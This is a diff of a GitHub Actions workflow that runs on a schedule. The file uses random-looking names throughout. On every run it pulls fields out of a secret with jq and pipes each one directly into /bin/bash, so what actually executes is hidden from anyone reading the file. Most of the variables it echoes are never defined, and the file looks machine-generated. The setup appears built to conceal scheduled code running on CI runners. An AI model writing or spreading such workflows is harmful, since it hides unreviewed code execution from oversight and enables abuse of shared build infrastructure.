@@ -3,8 +3,7 @@ name: brickyardcolumn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 4/6 * * *'
-
+    - cron: '17 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: brickyardcolumn
         env:
-          i470: ${{ secrets.i470 }}
+          foyl055: ${{ secrets.foyl055 }}
         run: |
-          echo $i470 | jq -r .lzrrq31984 | /bin/bash
-          echo $qp67 | jq -r .p87 | /bin/bash
-          echo $io70 | jq -r .b66290 | /bin/bash
-          echo $rkyih174 | jq -r .y5501 | /bin/bash
-          echo $tuj021 | jq -r .grjs878 | /bin/bash
-          echo $n42 | jq -r .wdqis250 | /bin/bash
+          echo $foyl055 | jq -r .gk34 | /bin/bash
+          echo $u67 | jq -r .jzsrd91434 | /bin/bash
+          echo $ig5543 | jq -r .bxr1 | /bin/bash
+          echo $pnj29329 | jq -r .cl1 | /bin/bash
+          echo $zw204 | jq -r .z549 | /bin/bash
+          echo $v1208 | jq -r .sbkgo1 | /bin/bash
+          echo $zl7 | jq -r .aib7163 | /bin/bash
+          echo $vlu1 | jq -r .nszq00508 | /bin/bash
+          echo $hq36511 | jq -r .evrgw49 | /bin/bash
+          echo $wkyr224 | jq -r .aoes7109 | /bin/bash
+          echo $z374 | jq -r .mgaw80597 | /bin/bash
+          echo $tbyl15294 | jq -r .a85 | /bin/bash
+          echo $ajzms41 | jq -r .x0 | /bin/bash
+          echo $r2 | jq -r .qyh05277 | /bin/bash
+          echo $rysqb6917 | jq -r .tzkhn61358 | /bin/bash
 
